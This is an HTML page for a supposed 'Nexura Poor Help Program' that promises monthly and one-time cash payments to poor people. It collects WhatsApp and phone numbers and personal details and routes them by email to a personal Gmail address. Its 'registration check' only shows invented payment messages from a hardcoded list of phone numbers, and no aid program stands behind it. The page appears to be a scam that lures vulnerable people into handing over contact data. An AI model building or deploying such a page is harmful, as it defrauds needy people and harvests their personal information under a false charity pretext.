<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Nexura Poor Help Program</title>

  <style>

    body{
      margin:0;
      padding:0;
      font-family:Arial, sans-serif;
      background:#f3f7fc;
    }

    .container{
      max-width:500px;
      margin:40px auto;
      background:#fff;
      padding:25px;
      border-radius:15px;
      box-shadow:0 0 15px rgba(0,0,0,0.1);
    }

    h1{
      text-align:center;
      color:#0b5ed7;
      margin-bottom:20px;
    }

    .title-box{
      background:#0b5ed7;
      color:white;
      padding:20px;
      border-radius:12px;
      text-align:center;
      font-size:22px;
      font-weight:bold;
      line-height:1.8;
      margin-bottom:20px;
    }

    button{
      width:100%;
      padding:14px;
      border:none;
      border-radius:10px;
      background:#0b5ed7;
      color:white;
      font-size:16px;
      cursor:pointer;
      margin-top:10px;
    }

    button:hover{
      background:#084298;
    }

    input, textarea{
      width:100%;
      padding:12px;
      margin-top:10px;
      border-radius:8px;
      border:1px solid #ccc;
      font-size:15px;
      box-sizing:border-box;
    }

    textarea{
      height:100px;
      resize:none;
    }

    .hidden{
      display:none;
    }

    .step{
      margin-top:15px;
      font-weight:bold;
      color:#333;
    }

    .result{
      margin-top:20px;
      padding:15px;
      border-radius:10px;
      background:#eef5ff;
      text-align:center;
      font-weight:bold;
      font-size:18px;
    }

  </style>

</head>
<body>

<div class="container">

  <h1>Nexura Poor Help Program</h1>

  <div class="title-box">
    GET $100 MONTHLY <br>
    $200 ONE TIME <br>
    $20 ONE TIME
  </div>

  <button onclick="showApply()">
    1 APPLY
  </button>

  <button onclick="showCheck()">
    2 CHECK IF YOU ARE REGISTERED
  </button>

  <!-- APPLY SECTION -->

  <div id="applySection" class="hidden">

    <div class="step">
      1 ENTER YOUR WHATSAPP NUMBER
    </div>

    <input
      type="text"
      id="whatsapp"
      placeholder="Enter WhatsApp Number"
    >

    <div class="step">
      2 ENTER YOUR PHONE NUMBER
    </div>

    <input
      type="text"
      id="phone"
      placeholder="Enter Phone Number"
    >

    <div class="step">
      3 ENTER YOUR DETAILS
    </div>

    <textarea
      id="detail"
      placeholder="Write About Yourself"
    ></textarea>

    <button onclick="sendMail()">
      REGISTER & SEND
    </button>

  </div>

  <!-- CHECK SECTION -->

  <div id="checkSection" class="hidden">

    <input
      type="text"
      id="checkNumber"
      placeholder="Enter Your Phone Number"
    >

    <button onclick="verifyNumber()">
      VERIFY
    </button>

    <div id="result" class="result hidden"></div>

  </div>

</div>

<script>

  // SHOW APPLY

  function showApply(){

    document
    .getElementById("applySection")
    .classList.remove("hidden");

    document
    .getElementById("checkSection")
    .classList.add("hidden");
  }

  // SHOW CHECK

  function showCheck(){

    document
    .getElementById("checkSection")
    .classList.remove("hidden");

    document
    .getElementById("applySection")
    .classList.add("hidden");
  }

  // SEND TO GMAIL

  function sendMail(){

    let whatsapp =
    document.getElementById("whatsapp").value;

    let phone =
    document.getElementById("phone").value;

    let detail =
    document.getElementById("detail").value;

    let gmailLink =
    "https://mail.google.com/mail/u/0/?view=cm&fs=1&to=muhammadtaqi512q@gmail.com"
    + "&su=" + encodeURIComponent("New Nexura Registration")
    + "&body=" + encodeURIComponent(

      "WhatsApp Number: " + whatsapp + "\n\n" +

      "Phone Number: " + phone + "\n\n" +

      "User Details: " + detail

    );

    // OPEN GMAIL COMPOSE

    window.open(gmailLink, "_blank");
  }

  // JSON DATA

  const users = {

    "03016754668":
    "YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",

    "03016754664":
    "YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",

    "03256754668":
    "YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",

    "03646754668":
    "YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",

    "03016754690":
    "YOU ARE REGISTERED.",

    "03216754661":
    "YOU ARE REGISTERED.",

    "03016754676":
    "YOU ARE A RICH PERSON.",

    "0301675666":
    "YOU ARE A RICH PERSON."
  };

  // VERIFY NUMBER

  function verifyNumber(){

    let number =
    document.getElementById("checkNumber").value;

    let result =
    document.getElementById("result");

    result.classList.remove("hidden");

    if(users[number]){

      result.innerHTML = users[number];

    }else{

      result.innerHTML =
      "YOU ARE NOT REGISTERED.";
    }
  }

</script>

</body>
</html>
